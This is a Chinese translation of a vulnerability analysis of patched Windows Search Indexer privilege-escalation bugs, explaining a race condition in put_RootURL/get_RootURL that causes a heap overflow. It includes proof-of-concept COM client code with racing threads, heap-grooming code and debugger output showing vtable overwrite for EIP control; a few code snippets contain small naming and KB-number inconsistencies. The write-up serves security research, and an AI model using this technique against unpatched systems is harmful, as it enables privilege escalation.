
# Windows Search Indexer本地权限提升漏洞分析


                                阅读量   
                                **429885**
                            
                        |
                        
                                                                                                                                    ![](./img/202306/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者diffense，文章来源：blog.diffense.co.k
                                <br>原文地址：[http://blog.diffense.co.kr/2020/03/26/SearchIndexer.html](http://blog.diffense.co.kr/2020/03/26/SearchIndexer.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/202306/t01022e382de748f8e7.jpg)](./img/202306/t01022e382de748f8e7.jpg)



## 概述

2020年1月至2月期间，微软修复了Windows Search Indexer（Windows搜索索引器）中存在的多个漏洞。

[![](./img/202306/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0141c21dafb5e74c9d.png)

如上图所示，微软在Windows Search Indexer中发现了众多本地权限提升漏洞。在本文中，我们将分析这些补丁的细节，并分享这些漏洞的详细信息。



## 关于Windows Search Indexer

Windows Search Indexer是一项用于为Windows Search处理文件索引的Windows系统服务，该服务为Windows系统内置的文件搜索引擎提供了动力，而文件搜索引擎则用于包括“开始”菜单搜索框、Windows资源管理器以及库功能在内的诸多地方。

Search Indexer主要使用GUI图形界面，将用户定向到该服务的界面，如下图所示。

[![](./img/202306/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a1b6b3e50ea7699c.png)

索引过程中的所有数据库（包括临时数据库）都将存储为文件的形式以进行管理。通常情况下，在Windows Server中，整个过程都是使用NT AUTHORITY SYSTEM特权来执行的。然而，如果由于修改文件路径而导致出现逻辑错误，这可能会触发特权提升（例如：Symlink攻击）。

考虑到近期在Windows服务中发现的大多数漏洞都是由于逻辑错误而导致的本地权限提升（LPE）漏洞，因此我们在分析之前，也首先将Search Indexer的漏洞假定为这种类型。但在详细分析的过程中，我们却发现事实并非如此。



## 补丁差异对比

我们进行分析所使用的环境是Windows 7 x86，因为该操作系统所对应的更新补丁相对较小，这将有助于我们识别补丁安装前后代码的差异。我们下载了该模块的两个补丁版本。

可以从Microsoft更新目录下载补丁：

1、修复后版本（2020年1月例行补丁）：KB45343142

2、修复后版本（2020年2月例行补丁）：KB45378133

要进行对比，我们首先需要对比补丁程序修改前后的二进制文件差异。实际上，这两个补丁仅修改了一个二进制文件，即searchindexer.exe。

[![](./img/202306/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014ce347556951e504.png)

上述补丁，是通过修改CSearchCrawlScopeManager和CSearchRoot类来完成漏洞修复的。前一个类是在1月补丁中实现了修复，而后者是在2月补丁中实现修复。这两个类中，都包含相同的更改内容，因此我们仅专注于对CSearchRoot类的分析。

如下图所示，展示了这个类中的原始代码，该代码使用锁来实现安全访问共享资源。我们推断，访问共享资源时会导致竞争条件漏洞的发生，因为在补丁中包含putter和getter函数。

[![](./img/202306/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d361072865f600b8.png)

[![](./img/202306/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017dd7449999198d01.png)



## 如何与接口进行交互

我们参考了MSDN官方文档，以进一步了解如何使用这些类。我们发现，这些类都与Crawl Scope Manager有关。接下来，我们详细分析这个类中包含的方法。

根据MSDN：

Crawl Scope Manager（CSM）是一组API，可以用于添加、删除和枚举Windows Search Indexer的搜索根和范围规则。当使用索引器开始爬取新的容器时，可以使用CSM来设置要搜索的根，并为搜索根中的路径设置作用域规则。

CSM的接口包括：

IEnumSearchRoots<br>
IEnumSearchScopeRules<br>
ISearchCrawlScopeManager<br>
ISearchCrawlScopeManager2<br>
ISearchRoot<br>
ISearchScopeRule<br>
ISearchItem

举例来说，添加、删除和枚举搜索根和范围规则，可以通过以下方式来编写：

ISearchCrawlScopeManager通知搜索引擎需要爬取和（或）监控的容器，以及要包含或排除的容器下项目。如果需要添加新的搜索根，需要实例化ISearchRoot对象，设置根属性，然后调用ISearchCrawlScopeManager::AddRoot并将其传递给ISearchRoot对象的指针。

```
// Add RootInfo &amp; Scope Rule
pISearchRoot-&gt;put_RootURL(L"file:///C: ");
pSearchCrawlScopeManager-&gt;AddRoot(pISearchRoot);
pSearchCrawlScopeManager-&gt;AddDefaultScopeRule(L"file:///C:Windows", fInclude, FF_INDEXCOMPLEXURLS);

// Set Registry key
pSearchCrawlScopeManager-&gt;SaveAll();
```

当我们不再希望对该URL进行索引时，还可以使用ISearchCrawlScopeManager从爬取范围中删除根。删除根的同时，会删除该URL的所有范围规则。我们可以卸载应用程序，删除所有数据，然后从搜索范围中删除搜索根目录，随后Crawl Scope Manager将会删除根，同时也将删除与该根相关联的所有范围规则。

```
// Remove RootInfo &amp; Scope Rule
ISearchCrawlScopeManager-&gt;RemoveRoot(pszURL);

// Set Registry key
ISearchCrawlScopeManager-&gt;SaveAll();
```

CSM使用IEnumSearchRoots来枚举搜索根。出于多种目的，我们可以使用这个类来枚举搜索根。例如，我们可能想要在用户界面中显示整个爬取的范围，或者发现爬取范围中是否已经包含特定的根目录或根目录的子级。

```
// Display RootInfo
PWSTR pszUrl = NULL;
pSearchRoot-&gt;get_RootURL(&amp;pszUrl);
wcout &lt;&lt; L"t" &lt;&lt; pszUrl;

// Display Scope Rule
IEnumSearchScopeRules *pScopeRules;
pSearchCrawlScopeManager-&gt;EnumerateScopeRules(&amp;pScopeRules);

ISearchScopeRule *pSearchScopeRule;
pScopeRules-&gt;Next(1, &amp;pSearchScopeRule, NULL))

pSearchScopeRule-&gt;get_PatternOrURL(&amp;pszUrl);
wcout &lt;&lt; L"t" &lt;&lt; pszUrl;
```

由此，我们认为，在处理URL的过程中会产生漏洞。接下来，我们将分析导致该漏洞存在的根本原因。



## 根本原因分析

我们针对以下功能进行了二进制分析：

ISearchRoot::put_RootURL<br>
ISearchRoot::get_RootURL

在分析ISearchRoot::put_RootURL和ISearchRoot::get_RootURL时，我们发现其中引用了对象的共享变量（CSearchRoot + 0x14）。

put_RootURL函数将用户控制的数据写入到CSearchRoot+0x14内存中。get_RootURL函数读取位于CSearchRoot+0x14内存中的数据。该漏洞似乎是由于与补丁有关的共享变量引起的。

[![](./img/202306/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0120b549cc29d2d1d7.png)

[![](./img/202306/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01299ed087a273a8c1.png)

我们就从这里开始分析。

该漏洞位于两次获取长度的过程中，在发生以下情况时，可能会触发该漏洞：

1、第一次获取：用作内存分配大小（第9行）；<br>
2、第二次获取：用作内存副本大小（第13行）。

[![](./img/202306/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0168963ecebd03c1f8.png)

如果第一次和第二次的大小不同，则可能会发生堆溢出的情况，特别是在第二次获取到的大小较大的情况下。我们认为，在发生内存复制之前，攻击者可能通过竞争条件更改了pszURL的大小。



## 发生崩溃

通过OleView，我们可以看到Windows Search Manager提供的接口。并且，我们需要根据接口的方法来复现漏洞。

[![](./img/202306/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011e499e1a1deb2055.png)

根据MSDN提供的信息，我们可以使用基于COM的命令行源代码，轻松地对其进行测试。我们编写了用于攻击漏洞所在函数的COM客户端代码，如下所示：

```
int wmain(int argc, wchar_t *argv[])
{
    // Initialize COM library
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);

    // Class instantiate
    ISearchRoot *pISearchRoot;
    CoCreateInstance(CLSID_CSearchRoot, NULL, CLSCTX_ALL, IID_PPV_ARGS(&amp;pISearchRoot));

    // Vulnerable functions hit
    pISearchRoot-&gt;put_RootURL(L"Shared RootURL");
    PWSTR pszUrl = NULL;
    HRESULT hr = pSearchRoot-&gt;get_RootURL(&amp;pszUrl);
    wcout &lt;&lt; L"t" &lt;&lt; pszUrl;
    CoTaskMemFree(pszUrl);

    // Free COM resource, End
    pISearchRoot-&gt;Release();
    CoUninitialize();
}
```

在此之后，触发漏洞的过程非常简单。我们创建了两个线程：一个线程将不同长度的数据写入共享缓冲区，另一个线程在与此同时从共享缓冲区中读取数据。

```
DWORD __stdcall thread_putter(LPVOID param)
{
    ISearchManager *pSearchManager = (ISearchManager*)param;
    while (1) {
        pSearchManager-&gt;put_RootURL(L"AA");
        pSearchManager-&gt;put_RootURL(L"AAAAAAAAAA");
    }
    return 0;
}

DWORD __stdcall thread_getter(LPVOID param)
{
    ISearchRoot *pISearchRoot = (ISearchRoot*)param;
    PWSTR get_pszUrl;
    while (1) {
        pISearchRoot-&gt;get_RootURL(&amp;get_pszUrl);
    }
    return 0;
}
```

由此就导致了崩溃。

[![](./img/202306/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0189b26146e294c82b.png)

毫无疑问，在StringCchCopyW函数复制RootURL数据之前，竞争条件就已经成功，并且导致堆溢出。



## EIP控制

为了控制EIP，我们需要为存在漏洞的服务器堆创建一个对象。

我们编写了如下的客户端代码，以跟踪堆的状态。

```
int wmain(int argc, wchar_t *argv[])
{
    CoInitializeEx(NULL, COINIT_MULTITHREADED | COINIT_DISABLE_OLE1DDE);
    ISearchRoot *pISearchRoot[20];
    for (int i = 0; i &lt; 20; i++) {
        CoCreateInstance(CLSID_CSearchRoot, NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&amp;pISearchRoot[i]));
    }
    pISearchRoot[3]-&gt;Release();
    pISearchRoot[5]-&gt;Release();
    pISearchRoot[7]-&gt;Release();
    pISearchRoot[9]-&gt;Release();
    pISearchRoot[11]-&gt;Release();


    CreateThread(NULL, 0, thread_putter, (LPVOID)pISearchRoot[13], 0, NULL);
    CreateThread(NULL, 0, thread_getter, (LPVOID)pISearchRoot[13], 0, NULL);
    Sleep(500);

    CoUninitialize();
    return 0;
}
```

由此发现，如果客户端不释放pISearchRoot对象，那么IRpcStubBuffer对象将会保留在服务器堆上。并且，我们还发现，IRpcStubBuffer对象位于漏洞所在堆的位置附近。

```
0:010&gt; !heap -p -all
    ...
    03d58f10 0005 0005  [00]   03d58f18    0001a - (busy)     &lt;-- CoTaskMalloc return
        mssprxy!_idxpi_IID_Lookup &lt;PERF&gt; (mssprxy+0x75)
    03d58f38 0005 0005  [00]   03d58f40    00020 - (free)
    03d58f60 0005 0005  [00]   03d58f68    0001c - (busy)     &lt;-- IRpcStubBuffer Obj
      ? mssprxy!_ISearchRootStubVtbl+10
    03d58f88 0005 0005  [00]   03d58f90    0001c - (busy)
      ? mssprxy!_ISearchRootStubVtbl+10                       &lt;-- IRpcStubBuffer Obj
    03d58fb0 0005 0005  [00]   03d58fb8    00020 - (busy)
    03d58fd8 0005 0005  [00]   03d58fe0    0001c - (busy)
      ? mssprxy!_ISearchRootStubVtbl+10                       &lt;-- IRpcStubBuffer Obj
    03d59000 0005 0005  [00]   03d59008    0001c - (busy)
      ? mssprxy!_ISearchRootStubVtbl+10                       &lt;-- IRpcStubBuffer Obj
    03d59028 0005 0005  [00]   03d59030    00020 - (busy)
    03d59050 0005 0005  [00]   03d59058    00020 - (busy)
    03d59078 0005 0005  [00]   03d59080    00020 - (free)
    03d590a0 0005 0005  [00]   03d590a8    00020 - (free)
    03d590c8 0005 0005  [00]   03d590d0    0001c - (busy)
      ? mssprxy!_ISearchRootStubVtbl+10                       &lt;-- IRpcStubBuffer Obj
```

在COM中，所有的接口都有自己的接口存根空间（Interface Stub Space）。存根是用于在RPC通信期间支持远程方法调用的较小内存空间，而IRpcStubBuffer是这类接口存根的主要接口。在这个过程中，支持pISearchRoot的接口存根的IRpcStubBuffer仍然保留在服务器堆中。

IRpcStubBuffer的vtfunction如下：

```
0:003&gt; dds poi(03d58f18) l10
    71215bc8  7121707e mssprxy!CStdStubBuffer_QueryInterface
    71215bcc  71217073 mssprxy!CStdStubBuffer_AddRef
    71215bd0  71216840 mssprxy!CStdStubBuffer_Release
    71215bd4  71217926 mssprxy!CStdStubBuffer_Connect
    71215bd8  71216866 mssprxy!CStdStubBuffer_Disconnect &lt;-- client call : CoUninitialize();
    71215bdc  7121687c mssprxy!CStdStubBuffer_Invoke
    71215be0  7121791b mssprxy!CStdStubBuffer_IsIIDSupported
    71215be4  71217910 mssprxy!CStdStubBuffer_CountRefs
    71215be8  71217905 mssprxy!CStdStubBuffer_DebugServerQueryInterface
    71215bec  712178fa mssprxy!CStdStubBuffer_DebugServerRelease
```

当客户端的COM未初始化时，IRpcStubBuffer::Disconnect会断开对象指针的所有连接。因此，如果客户端调用CoUninitialize函数，则会在服务器上调用CStdStubBuffer_Disconnect函数。这意味着，用户可以构造一个伪造的vtable，从而调用该函数。

但是，我们并不能每次都看到IRpcStubBuffer分配在同一个堆上。因此，攻击者可能需要多次尝试来构造堆布局。经过几次尝试后，发现IRpcStubBuffer对象可以被以下可控值（0x45454545）覆盖。

至此，我们就已经证明了，可以间接调用内存中的任何函数。

[![](./img/202306/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016f4f34ed2b951f6c.png)



## 总结

近期，在Windows服务中发现的大多数本地权限提升漏洞都可以归类为逻辑漏洞。通过上述方式对Windows Search Indexer的内存损坏漏洞进行分析的过程非常有趣。我们知道，在后续，很可能还会发现其他Windows服务中存在这样的内存损坏漏洞，因此防御者不应该忽视这样的可能性。

我们希望上述分析过程可以对其他漏洞研究人员有所帮助，同时希望这些信息可以用于进一步的研究。



## 参考

[1] [https://portal.msrc.microsoft.com/en-us/security-guidance/acknowledgments](https://portal.msrc.microsoft.com/en-us/security-guidance/acknowledgments)<br>
[2] [https://www.catalog.update.microsoft.com/Search.aspx?q=KB4534314](https://www.catalog.update.microsoft.com/Search.aspx?q=KB4534314)<br>
[3] [https://www.catalog.update.microsoft.com/Search.aspx?q=KB4537813](https://www.catalog.update.microsoft.com/Search.aspx?q=KB4537813)<br>
[4] [https://docs.microsoft.com/en-us/windows/win32/search/-search-3x-wds-extidx-csm](https://docs.microsoft.com/en-us/windows/win32/search/-search-3x-wds-extidx-csm)<br>
[5] [https://github.com/tyranid/oleviewdotnet](https://github.com/tyranid/oleviewdotnet)<br>
[6] [https://docs.microsoft.com/en-us/windows/win32/search/-search-sample-crawlscopecommandline](https://docs.microsoft.com/en-us/windows/win32/search/-search-sample-crawlscopecommandline)
